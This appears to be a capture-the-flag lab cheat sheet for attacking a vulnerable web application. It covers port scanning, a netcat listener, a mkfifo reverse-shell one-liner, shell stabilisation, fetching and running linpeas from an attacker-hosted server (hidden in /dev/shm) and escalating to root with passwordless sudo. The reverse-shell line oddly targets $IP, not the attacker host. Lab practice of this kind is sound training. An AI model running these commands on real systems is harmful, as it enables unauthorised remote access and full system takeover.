
# Vulnerable Web Application Attacking

```bash
export IP=
export PORT=
export HOSTIP=
```

1. Nmap Scanning:
```bash
nmap -p- -sC -sV -oN nmap/initial $IP 
```


2. Get a reverse Shell:

Start a listener:
```bash
nc -lnvp $PORT
```


[Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)


```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```

3. Stabilize shell:

[Poor Man's Pentest](https://github.com/JohnHammond/poor-mans-pentest/blob/master/stabilize_shell.sh)

```bash
# On remote
python3 -c "import pty; pty.spawn('/bin/bash')"

# ctrl z
stty raw -echo
fg
export TERM=xterm
```

## User flag

```bash
cat ~/flag.txt
```

4. Privilege Escalation

Host linpeas.sh on attacker machine
```bash
python3 -m http.server 1337
```

Download and run linpeas
```bash
cd /dev/shm # Hiding lol
wget "$HOSTIP/linpeas.sh"
chmod +x linpeas.sh
./linpeas.sh
```

Linpeas will tell us that this user can run `sudo` without a password!
Thats our ticket in!

```bash
sudo su
```

And we're root!

### Root Flag:

```bash
cat /root/flag.txt
```

